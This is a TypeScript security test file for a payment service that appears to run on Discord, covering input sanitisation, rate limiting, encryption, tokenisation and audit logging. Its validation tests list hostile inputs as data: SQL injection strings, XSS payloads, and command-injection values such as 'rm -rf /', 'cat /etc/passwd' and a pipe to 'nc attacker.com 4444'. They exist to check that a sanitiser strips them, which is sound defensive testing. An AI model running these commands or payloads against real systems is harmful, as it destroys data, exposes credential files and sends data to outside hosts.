import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest';
import { InputValidator } from '../InputValidator';
import { RateLimiter, PaymentRateLimiters } from '../RateLimiter';
import { EncryptionService, PaymentDataEncryption } from '../Encryption';
import { AuditLogger, AuditEventType, AuditSeverity } from '../AuditLogger';
import { SecurityError, RateLimitError } from '../ErrorHandler';

describe('Security Tests', () => {
    describe('Input Validation Security', () => {
        describe('SQL Injection Prevention', () => {
            it('should sanitize SQL injection attempts', () => {
                const maliciousInputs = [
                    "'; DROP TABLE users; --",
                    "1' OR '1'='1",
                    "admin'/*",
                    "1; DELETE FROM transactions WHERE 1=1; --",
                ];

                maliciousInputs.forEach(input => {
                    const sanitized = InputValidator.sanitizeString(input);
                    expect(sanitized).not.toContain("'");
                    expect(sanitized).not.toContain(';');
                    expect(sanitized).not.toContain('--');
                    expect(sanitized).not.toContain('/*');
                });
            });
        });

        describe('XSS Prevention', () => {
            it('should sanitize XSS attempts', () => {
                const xssInputs = [
                    '<script>alert("xss")</script>',
                    '<img src="x" onerror="alert(1)">',
                    'javascript:alert(1)',
                    '<svg onload="alert(1)">',
                    '&lt;script&gt;alert(1)&lt;/script&gt;',
                ];

                xssInputs.forEach(input => {
                    const sanitized = InputValidator.sanitizeString(input);
                    expect(sanitized).not.toContain('<');
                    expect(sanitized).not.toContain('>');
                    expect(sanitized).not.toContain('"');
                    expect(sanitized).not.toContain("'");
                });
            });
        });

        describe('Command Injection Prevention', () => {
            it('should sanitize command injection attempts', () => {
                const commandInputs = [
                    'test; rm -rf /',
                    'test && cat /etc/passwd',
                    'test | nc attacker.com 4444',
                    'test `whoami`',
                    'test $(id)',
                ];

                commandInputs.forEach(input => {
                    const sanitized = InputValidator.sanitizeString(input);
                    expect(sanitized).not.toContain(';');
                    expect(sanitized).not.toContain('&&');
                    expect(sanitized).not.toContain('|');
                    expect(sanitized).not.toContain('`');
                    expect(sanitized).not.toContain('$');
                });
            });
        });

        describe('Input Length Validation', () => {
            it('should enforce maximum input lengths', () => {
                const longString = 'a'.repeat(2000);
                const sanitized = InputValidator.sanitizeString(longString);
                expect(sanitized.length).toBeLessThanOrEqual(1000);
            });

            it('should validate description length limits', () => {
                const longDescription = 'a'.repeat(600);
                const result = InputValidator.validateDescription(longDescription);
                expect(result.isValid).toBe(false);
                expect(result.errors).toContain('Description cannot exceed 500 characters');
            });
        });

        describe('Format Validation', () => {
            it('should validate Discord ID format strictly', () => {
                const invalidIds = [
                    '123', // too short
                    '12345678901234567890', // too long
                    'abc123456789012345', // contains letters
                    '123456789012345678a', // ends with letter
                    '', // empty
                    null,
                    undefined,
                ];

                invalidIds.forEach(id => {
                    const result = InputValidator.validateDiscordId(id as any);
                    expect(result.isValid).toBe(false);
                });

                const validId = '123456789012345678';
                const result = InputValidator.validateDiscordId(validId);
                expect(result.isValid).toBe(true);
            });

            it('should validate payment amounts strictly', () => {
                const invalidAmounts = [
                    -1, // negative
                    0, // zero
                    0.001, // too small
                    10001, // too large
                    'abc', // non-numeric
                    '1.234', // too many decimals
                    Infinity,
                    NaN,
                ];

                invalidAmounts.forEach(amount => {
                    const result = InputValidator.validateAmount(amount);
                    expect(result.isValid).toBe(false);
                });

                const validAmounts = [0.01, 1, 100.50, '50.25'];
                validAmounts.forEach(amount => {
                    const result = InputValidator.validateAmount(amount);
                    expect(result.isValid).toBe(true);
                });
            });
        });
    });

    describe('Rate Limiting Security', () => {
        let rateLimiter: RateLimiter;

        beforeEach(() => {
            rateLimiter = new RateLimiter({
                windowMs: 1000, // 1 second for testing
                maxRequests: 3,
            });
        });

        afterEach(() => {
            rateLimiter.destroy();
        });

        it('should enforce rate limits correctly', async () => {
            const userId = 'test-user';
            const action = 'test-action';

            // First 3 requests should be allowed
            for (let i = 0; i < 3; i++) {
                const result = await rateLimiter.checkLimit(userId, action);
                expect(result.allowed).toBe(true);
            }

            // 4th request should be blocked
            const result = await rateLimiter.checkLimit(userId, action);
            expect(result.allowed).toBe(false);
            expect(result.retryAfter).toBeGreaterThan(0);
        });

        it('should reset limits after window expires', async () => {
            const userId = 'test-user';
            const action = 'test-action';

            // Exhaust the limit
            for (let i = 0; i < 3; i++) {
                await rateLimiter.checkLimit(userId, action);
            }

            // Should be blocked
            let result = await rateLimiter.checkLimit(userId, action);
            expect(result.allowed).toBe(false);

            // Wait for window to expire
            await new Promise(resolve => setTimeout(resolve, 1100));

            // Should be allowed again
            result = await rateLimiter.checkLimit(userId, action);
            expect(result.allowed).toBe(true);
        });

        it('should handle concurrent requests safely', async () => {
            const userId = 'test-user';
            const action = 'test-action';

            // Make 10 concurrent requests
            const promises = Array(10).fill(0).map(() =>
                rateLimiter.checkLimit(userId, action)
            );

            const results = await Promise.all(promises);
            const allowedCount = results.filter(r => r.allowed).length;

            // Only 3 should be allowed
            expect(allowedCount).toBe(3);
        });

        describe('Payment Rate Limiters', () => {
            let paymentLimiters: PaymentRateLimiters;

            beforeEach(() => {
                paymentLimiters = PaymentRateLimiters.getInstance();
            });

            it('should throw RateLimitError when payment limit exceeded', async () => {
                const userId = 'test-user';

                // This would need to be tested with a shorter window for testing
                // In a real test, you'd mock the rate limiter or use dependency injection
                await expect(async () => {
                    // Simulate exceeding the limit
                    for (let i = 0; i < 12; i++) {
                        await paymentLimiters.checkPaymentLimit(userId);
                    }
                }).rejects.toThrow(RateLimitError);
            });
        });
    });

    describe('Encryption Security', () => {
        let encryptionService: EncryptionService;
        let paymentEncryption: PaymentDataEncryption;

        beforeEach(() => {
            // Mock the environment config for testing
            vi.mock('../../config/environment', () => ({
                config: {
                    ENCRYPTION_KEY: 'test-encryption-key-that-is-long-enough-for-security',
                },
            }));

            encryptionService = EncryptionService.getInstance();
            paymentEncryption = new PaymentDataEncryption();
        });

        describe('Data Encryption', () => {
            it('should encrypt and decrypt data correctly', () => {
                const plaintext = 'sensitive payment data';
                const encrypted = encryptionService.encrypt(plaintext);

                expect(encrypted.encrypted).toBeDefined();
                expect(encrypted.iv).toBeDefined();
                expect(encrypted.tag).toBeDefined();
                expect(encrypted.encrypted).not.toBe(plaintext);

                const decrypted = encryptionService.decrypt(encrypted);
                expect(decrypted).toBe(plaintext);
            });

            it('should produce different ciphertext for same plaintext', () => {
                const plaintext = 'test data';
                const encrypted1 = encryptionService.encrypt(plaintext);
                const encrypted2 = encryptionService.encrypt(plaintext);

                expect(encrypted1.encrypted).not.toBe(encrypted2.encrypted);
                expect(encrypted1.iv).not.toBe(encrypted2.iv);
            });

            it('should fail decryption with tampered data', () => {
                const plaintext = 'sensitive data';
                const encrypted = encryptionService.encrypt(plaintext);

                // Tamper with the encrypted data
                encrypted.encrypted = encrypted.encrypted.slice(0, -2) + 'XX';

                expect(() => {
                    encryptionService.decrypt(encrypted);
                }).toThrow(SecurityError);
            });

            it('should use additional salt when requested', () => {
                const plaintext = 'test data';
                const encrypted = encryptionService.encrypt(plaintext, true);

                expect(encrypted.salt).toBeDefined();

                const decrypted = encryptionService.decrypt(encrypted);
                expect(decrypted).toBe(plaintext);
            });
        });

        describe('Tokenization', () => {
            it('should tokenize and detokenize data correctly', () => {
                const sensitiveData = 'credit-card-number-1234567890123456';
                const tokenized = encryptionService.tokenize(sensitiveData);

                expect(tokenized.token).toBeDefined();
                expect(tokenized.token).not.toBe(sensitiveData);
                expect(tokenized.token.length).toBe(64); // 32 bytes hex

                const detokenized = encryptionService.detokenize(tokenized.token);
                expect(detokenized).toBe(sensitiveData);
            });

            it('should fail detokenization with invalid token', () => {
                const invalidToken = 'invalid-token-12345';

                expect(() => {
                    encryptionService.detokenize(invalidToken);
                }).toThrow(SecurityError);
            });

            it('should revoke tokens correctly', () => {
                const sensitiveData = 'test data';
                const tokenized = encryptionService.tokenize(sensitiveData);

                const revoked = encryptionService.revokeToken(tokenized.token);
                expect(revoked).toBe(true);

                expect(() => {
                    encryptionService.detokenize(tokenized.token);
                }).toThrow(SecurityError);
            });
        });

        describe('Hashing', () => {
            it('should hash data consistently', () => {
                const data = 'password123';
                const hash1 = encryptionService.hash(data);
                const hash2 = encryptionService.hash(data);

                // Different salts should produce different hashes
                expect(hash1).not.toBe(hash2);

                // But both should verify correctly
                expect(encryptionService.verifyHash(data, hash1)).toBe(true);
                expect(encryptionService.verifyHash(data, hash2)).toBe(true);
            });

            it('should fail verification with wrong data', () => {
                const data = 'password123';
                const wrongData = 'password124';
                const hash = encryptionService.hash(data);

                expect(encryptionService.verifyHash(wrongData, hash)).toBe(false);
            });
        });

        describe('Payment Data Encryption', () => {
            it('should encrypt bank account data securely', () => {
                const accountNumber = '1234567890';
                const routingNumber = '123456789';

                const encrypted = paymentEncryption.encryptBankAccount(accountNumber, routingNumber);
                expect(encrypted.encrypted).toBeDefined();
                expect(encrypted.salt).toBeDefined(); // Should use salt for bank data

                const decrypted = paymentEncryption.decryptBankAccount(encrypted);
                expect(decrypted.account).toBe(accountNumber);
                expect(decrypted.routing).toBe(routingNumber);
            });

            it('should tokenize crypto wallet addresses', () => {
                const address = '1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa';
                const currency = 'BTC';

                const tokenized = paymentEncryption.tokenizeCryptoWallet(address, currency);
                expect(tokenized.token).toBeDefined();
                expect(tokenized.metadata?.currency).toBe(currency);

                const detokenized = paymentEncryption.detokenizeCryptoWallet(tokenized.token);
                expect(detokenized.address).toBe(address);
                expect(detokenized.currency).toBe(currency);
            });

            it('should mask sensitive data for display', () => {
                const bankAccount = '1234567890';
                const cryptoAddress = '1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa';
                const email = 'user@example.com';

                expect(paymentEncryption.maskSensitiveData(bankAccount, 'bank')).toBe('****7890');
                expect(paymentEncryption.maskSensitiveData(cryptoAddress, 'crypto')).toBe('1A1zP1...vfNa');
                expect(paymentEncryption.maskSensitiveData(email, 'email')).toBe('us***@example.com');
            });
        });

        describe('Secure Utilities', () => {
            it('should generate secure random strings', () => {
                const random1 = encryptionService.generateSecureRandom(16);
                const random2 = encryptionService.generateSecureRandom(16);

                expect(random1).not.toBe(random2);
                expect(random1.length).toBe(32); // 16 bytes = 32 hex chars
                expect(/^[a-f0-9]+$/.test(random1)).toBe(true);
            });

            it('should generate secure UUIDs', () => {
                const uuid1 = encryptionService.generateSecureUUID();
                const uuid2 = encryptionService.generateSecureUUID();

                expect(uuid1).not.toBe(uuid2);
                expect(/^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/.test(uuid1)).toBe(true);
            });

            it('should perform timing-safe string comparison', () => {
                const str1 = 'secret123';
                const str2 = 'secret123';
                const str3 = 'secret124';

                expect(encryptionService.secureCompare(str1, str2)).toBe(true);
                expect(encryptionService.secureCompare(str1, str3)).toBe(false);
                expect(encryptionService.secureCompare(str1, str1.slice(0, -1))).toBe(false);
            });
        });
    });

    describe('Audit Logging Security', () => {
        let auditLogger: AuditLogger;

        beforeEach(() => {
            auditLogger = AuditLogger.getInstance();
        });

        it('should log security events with proper severity', async () => {
            const logSpy = vi.spyOn(console, 'log').mockImplementation(() => { });

            await auditLogger.logSecurityEvent(
                AuditEventType.SUSPICIOUS_ACTIVITY,
                'test-user',
                { activity: 'multiple failed login attempts' },
                AuditSeverity.WARNING
            );

            expect(logSpy).toHaveBeenCalled();
            logSpy.mockRestore();
        });

        it('should handle critical events appropriately', async () => {
            const logSpy = vi.spyOn(console, 'error').mockImplementation(() => { });

            await auditLogger.logEvent({
                eventType: AuditEventType.DATA_ACCESS_VIOLATION,
                severity: AuditSeverity.CRITICAL,
                userId: 'test-user',
                details: { violation: 'unauthorized data access attempt' },
            });

            expect(logSpy).toHaveBeenCalledWith(
                expect.stringContaining('CRITICAL AUDIT EVENT'),
                expect.any(Object)
            );
            logSpy.mockRestore();
        });

        it('should not fail main operations when audit logging fails', async () => {
            // Mock a failing audit operation
            const originalLog = console.log;
            console.log = () => { throw new Error('Logging failed'); };

            // This should not throw
            await expect(auditLogger.logEvent({
                eventType: AuditEventType.PAYMENT_INITIATED,
                severity: AuditSeverity.INFO,
                userId: 'test-user',
                details: { amount: 100 },
            })).resolves.not.toThrow();

            console.log = originalLog;
        });
    });

    describe('Integration Security Tests', () => {
        it('should validate, rate limit, encrypt, and audit a complete flow', async () => {
            const userId = '123456789012345678';
            const amount = 100.50;
            const description = 'Test payment';

            // 1. Input validation
            const userIdValidation = InputValidator.validateDiscordId(userId);
            expect(userIdValidation.isValid).toBe(true);

            const amountValidation = InputValidator.validateAmount(amount);
            expect(amountValidation.isValid).toBe(true);

            const descValidation = InputValidator.validateDescription(description);
            expect(descValidation.isValid).toBe(true);

            // 2. Rate limiting (would normally check this)
            const rateLimiters = PaymentRateLimiters.getInstance();
            // In a real test, we'd check rate limits here

            // 3. Encryption
            const encryptionService = EncryptionService.getInstance();
            const encryptedData = encryptionService.encrypt(JSON.stringify({
                userId,
                amount: amountValidation.sanitizedValue,
                description: descValidation.sanitizedValue,
            }));
            expect(encryptedData.encrypted).toBeDefined();

            // 4. Audit logging
            const auditLogger = AuditLogger.getInstance();
            await auditLogger.logPaymentEvent(
                AuditEventType.PAYMENT_INITIATED,
                userId,
                'test-transaction-id',
                { amount: amountValidation.sanitizedValue }
            );

            // All steps should complete without errors
        });

        it('should handle security violations in the complete flow', async () => {
            const maliciousUserId = "'; DROP TABLE users; --";
            const invalidAmount = -100;
            const xssDescription = '<script>alert("xss")</script>';

            // Input validation should catch all issues
            const userIdValidation = InputValidator.validateDiscordId(maliciousUserId);
            expect(userIdValidation.isValid).toBe(false);

            const amountValidation = InputValidator.validateAmount(invalidAmount);
            expect(amountValidation.isValid).toBe(false);

            const descValidation = InputValidator.validateDescription(xssDescription);
            expect(descValidation.isValid).toBe(true); // Should be sanitized
            expect(descValidation.sanitizedValue).not.toContain('<');
            expect(descValidation.sanitizedValue).not.toContain('>');

            // Security events should be logged
            const auditLogger = AuditLogger.getInstance();
            await auditLogger.logSecurityEvent(
                AuditEventType.INVALID_INPUT_DETECTED,
                undefined,
                {
                    maliciousInput: maliciousUserId.substring(0, 50),
                    inputType: 'userId'
                },
                AuditSeverity.WARNING
            );
        });
    });
});